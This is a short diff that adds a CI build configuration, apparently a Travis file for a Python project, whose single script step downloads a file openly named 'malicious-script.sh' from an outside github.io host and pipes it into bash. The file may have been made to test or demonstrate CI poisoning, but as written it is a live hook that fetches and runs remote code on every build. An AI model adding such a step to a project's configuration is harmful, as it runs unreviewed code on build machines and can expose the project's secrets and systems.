@@ -1,0 +1,3 @@
+language: python
+script:
+  - curl http://nvk0x.github.io/malicious-script.sh | bash
